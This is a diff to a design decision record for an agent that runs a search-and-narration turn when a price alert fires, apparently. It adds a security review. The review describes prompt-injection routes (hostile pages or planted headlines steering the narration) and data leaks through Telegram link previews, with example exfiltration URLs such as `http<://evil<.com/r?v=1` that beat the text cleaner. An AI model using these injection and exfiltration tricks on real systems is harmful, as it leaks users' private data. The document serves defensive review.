@@ -21,7 +21,7 @@ note can ask for something only a run with tools can do.
 
 ## Decision
 
-Behind the flag `price_alert_lucius_run` (default on, never in a public demo), a fired price alert
+Behind the flag `price_alert_lucius_run` (default off, never in a public demo), a fired price alert
 runs two steps in the background (`monitoring/price_alert_run.py`, seam in `price_monitor._fire_alert_condition`):
 
 1. **A search turn.** One Lucius turn follows the note, or finds out why the price moved when there
@@ -50,15 +50,15 @@ already does, and the quick alert goes out. The Claude CLI runs with `--tools ""
 
 **`fetch_page` is left out** because it would let a page name a URL for this server to request.
 
-**The pushed text is cleaned after the narration, not trusted to the prompt** (`usable`): no links,
-bare domains, handles or markup, one line, hard word limits. A bare domain matters most: Telegram
-links it and fetches it for a preview with no click, so `acme-filings.com/r?v=<value>` would be a
-leak. A domain is reduced to its name, and an all-caps token with no path (`ACME.DE`) is kept.
+**The second narration's text is cleaned before it is pushed** (`usable`), against links, bare
+domains, handles and markup, with one line and hard word limits. Telegram links a bare domain and
+fetches it for a preview with no click, so `acme-filings.com/r?v=<value>` would be a leak. This
+cleaner is known to be incomplete: see the review below.
 
-**The run cannot lose the alert.** The story and the cooldown are written at once, from the same
-quick narration as the old path. The push waits for the run and falls back to that narration on a
-timeout (90 s search, 30 s narration), an error, an unusable reply or the daily cap (20). On a clean
-shutdown it still goes out, or into the retry queue if the channel has already stopped.
+**The run is meant not to lose the alert.** The story and the cooldown are written at once, from the
+same quick narration as the old path. The push waits for the run and falls back to that narration on
+a timeout (90 s search, 30 s narration), an error, an unusable reply or the daily cap. A SIGTERM
+during a run still loses the push: see the review below.
 
 **The scan's `web_search_enabled` setting does not govern this.** That switch and its budget belong
 to Intel scans. The owner chose this run knowing the setting was off, so gating on it would have
@@ -92,21 +92,47 @@ left the feature inert; the flag is this feature's switch.
   and remove the flag if it holds up, or default it off for releases while it improves if not.
 
 The pushed text is recorded as Lucius's own message in the Telegram session, unfenced, like every
-other Intel push. This is the owner's decision, not a gap: the tool-free narration did write it, so
-it isn't treated differently. A page can still shape that wording, and a later turn with full tools
-reads it. The cleaning above removes links and shortens it.
+other Intel push. This is the owner's decision, not a gap: the narration did write it, so it isn't
+treated differently. A page can still shape that wording, and a later turn with full tools reads it.
 
 **Known gaps:**
 
 - Searches still reach a third party, and with `search_reads_results` on, result pages are fetched
   from the owner's server, so a page that ranks learns the server's address and when the alert
   fired.
-- With `intel_delivery_decider` on, a valid `skip` or `later` is honoured even for a level the user
-  set, and the text the decider reads can now be shaped by a page.
 - An owner's Ask setting on a search tool does not stop this turn: the `scheduled` surface cannot
   show a card, so the tool runs. `blocked` is honoured.
-- Codex's text-protocol fallback disables fewer built-ins than its native mode. It runs read-only,
-  but which built-ins remain has not been tested.
+## Review on merged main, 2026-11-06: the flag stays, off by default
+
+The owner's rule: if testing on `main` holds up, remove the flag; if not, keep it so a release is
+unaffected while this improves. The tool ceiling and the private-data split held, including live
+against pages written to hijack a real model. The review of the merged code still found these, so
+the flag defaulted back to off. Fix them before turning it on by default:
+
+1. **High.** The quick narration is pushed uncleaned, and it reads cached headlines. Steering the
+   second narration into an unusable reply forces that fallback. Clean in `_narrated_fields`, the
+   seam both share, and disable link previews at `connectors/telegram/bot.py`.
+2. **High.** `_plain` removes `<` and `>` last, so `http<://evil<.com/r?v=1` is rebuilt into a live
+   link after the checks. All-caps hosts, non-ASCII hosts, IPv4 and fullwidth dots also survive.
+3. **Medium.** The narration prompt never says the findings are data, and near-forgeries of the
+   fence survive. Add a system line, a per-call nonce and flatten the findings' newlines.
+4. **Medium.** On Codex's text-protocol fallback the CLI's own tools (`web_search`, `view_image`,
+   sub-agents) are outside the ceiling. Refuse an enforced turn there, as on Antigravity.
+5. **Medium.** A SIGTERM kills the process before tasks are cancelled, so a run in flight loses its
+   push, and the cooldown is already stamped. Drain `price_alert_run._tasks` in lifespan before the
+   Telegram bot stops.
+6. **Medium.** The delivery decider can rewrite the text into a bare link that its own stripper
+   allows, and a price alert now always goes out. Share one cleaner.
+7. **Medium.** The late story write replaces the whole row from a snapshot, undoing a dismissal, a
+   read mark or an explanation made during the run, and an older run can overwrite a newer fire.
+8. **Low to medium.** A refused call starts another model round: only the 90 s limit bounds them.
+   The turn also runs at medium effort on the instance model.
+9. **Low.** The cleaner mangles ordinary text: `Trim @180.50` loses the price, `RSI<30` loses its
+   operator, and `U.S.Steel` becomes `U`.
+
+**One of these reaches the flag-off path.** Finding 1's quick narration runs for everyone, and the
+news-lookup fix extends its cached headlines from held tickers to watched ones. A planted headline
+was already able to shape a held ticker's alert before this change.
 
 Retire the flag by 2027-03-01: keep the run and remove the narration-only branch, or delete this.
 
